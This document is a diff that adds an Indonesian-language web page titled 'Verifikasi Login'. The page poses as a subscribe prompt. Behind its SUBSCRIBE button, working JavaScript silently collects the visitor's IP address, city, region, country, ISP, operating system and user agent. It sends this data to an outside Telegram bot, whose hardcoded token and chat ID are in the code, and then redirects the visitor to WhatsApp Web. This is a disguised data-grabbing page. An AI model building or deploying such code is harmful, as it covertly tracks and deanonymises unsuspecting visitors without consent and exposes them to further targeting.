@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 50px;
+      background-color: #f4f4f4;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      display: inline-block;
+    }
+    h2 {
+      color: #333;
+    }
+    button {
+      background: #f45;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #218838;
+    }
+    .subscribe-btn {
+      margin-top: 20px;
+    }
+  </style>
+  <script>
+    async function getDeviceInfo() {
+      let ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+      let userAgent = navigator.userAgent;
+      let os = navigator.platform;
+      
+      let data = {
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country_name,
+        isp: ipData.org,
+        os: os,
+        userAgent: userAgent
+      };
+
+      sendToTelegram(data);
+    }
+
+    function sendToTelegram(data) {
+      // Ganti dengan token bot dan chat ID Anda
+      let botToken = "6723353442:AAGk-5QCngfyUBMPnaBZBPp22OxClOFH6D8";  
+      let chatId = "5951232585";  
+
+      let caption = `🔹 *Info Perangkat:*
+📍 IP: ${data.ip}
+🏙 Kota: ${data.city}
+🌍 Wilayah: ${data.region}, ${data.country}
+📡 ISP: ${data.isp}
+🖥 OS: ${data.os}
+📱 User-Agent: ${data.userAgent}`;
+
+      // Ganti URL gambar dengan URL gambar yang Anda inginkan
+      let photoUrl = "https://i.ibb.co.com/ns8YcYky/IMG-20250221-WA0057-21.jpg";  
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: chatId, 
+          photo: photoUrl, 
+          caption: caption, 
+          parse_mode: "Markdown" 
+        })
+      }).then(() => {
+        window.location.href = "https://web.whatsapp.com";  // Redirect ke WhatsApp Web atau halaman lain
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <button onclick="getDeviceInfo()">SUBSCRIBE</button>
+
+    <div class="subscribe-btn">
+      <p>Jangan lupa Subscribe YouTube kami:</p>
+      <iframe width="200" height="50" src="https://www.tiktok.com/@sisuryaofficial/video/7442314954046328120?_r=1&u_code=eh4kjhe7gm651k&region=ID&mid=7436747274052799248&preview_pb=0&sharer_language=id&_d=ei9lb7jm7mejad&share_item_id=7442314954046328120&source=h5_t&timestamp=1740461058&user_id=7433733053711156242&sec_user_id=MS4wLjABAAAAQe9FIoDOAuF0TKKeIgV_uvXb3huupN9zTGLM0wZuttcUpwuO049TExQGV0hxo2J7&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7473232050746722103&share_link_id=cf4e297e-1e78-4144-b2d9-396fc32fb52f&share_app_id=1180&ugbiz_name=MAIN&link_reflow_popup_iteration_sharer=%7B%22click_empty_to_play%22%3A1%2C%22dynamic_cover%22%3A1%2C%22follow_to_play_duration%22%3A-1.0%2C%22profile_clickable%22%3A1%7D&enable_checksum=1" frameborder="0" allowfullscreen></iframe>
+    </div>
+  </div>
+</body>
+</html>
